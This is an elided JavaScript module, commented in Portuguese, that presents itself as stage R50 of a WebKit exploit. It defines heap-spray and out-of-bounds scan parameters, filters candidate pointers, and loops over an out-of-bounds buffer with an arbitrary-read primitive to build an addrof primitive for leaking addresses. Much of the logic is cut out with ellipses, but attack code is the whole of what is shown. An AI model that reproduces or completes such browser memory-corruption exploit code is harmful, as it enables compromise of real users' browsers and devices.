// js/script3/testArrayBufferVictimCrash.mjs (R50 - addrof via Varredura OOB & Heap Spray)
...
export const FNAME_MODULE = "WebKit_Exploit_R50_OOBScanForAddrof"; // Nome simplificado e exportado

// Parâmetros do Spray e Scan
const SPRAY_SIZE = 20000;
const SPRAY_MARKER_BIGINT = 0x4A53435745424B49n; // "JSCWEBKI" em ASCII, um marcador único
const HEAP_SCAN_RANGE_BYTES = 0x800000; // 8MB de varredura em torno do ponteiro encontrado
const HEAP_SCAN_STEP = 0x8;

// Parâmetros da Varredura OOB inicial para encontrar o primeiro ponteiro
const OOB_SCAN_WINDOW_BYTES = 0x200000; // Varredura de 2MB dentro do nosso buffer OOB
const OOB_SCAN_STEP = 0x4; // Ler de 4 em 4 bytes para testar cada alinhamento de 64 bits
...
function isValidPointer(ptr, context = "") {
    ...
    if (high === 0x7FF80000 && low === 0x0) return false; // Excluir NaN específico
    if ((high & 0x7FF00000) === 0x7FF00000) return false; // Excluir NaNs genéricos
    if (high === 0 && low < 0x10000) return false; // Excluir ponteiros baixos
    return true;
}
...
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R50() {
    ...
    try {
        ...
        logS3(`   Varrendo os primeiros ${OOB_SCAN_WINDOW_BYTES / 1024} KB da janela OOB usando arb_read...`, 'info');
        
        for (let offset = 0; offset < OOB_SCAN_WINDOW_BYTES; offset += OOB_SCAN_STEP) {
            try {
                // arb_read agora lê a partir da base do nosso buffer OOB
        ...
        const target_function_for_addrof = function someUniqueLeakFunctionR50_SprayTarget() {};
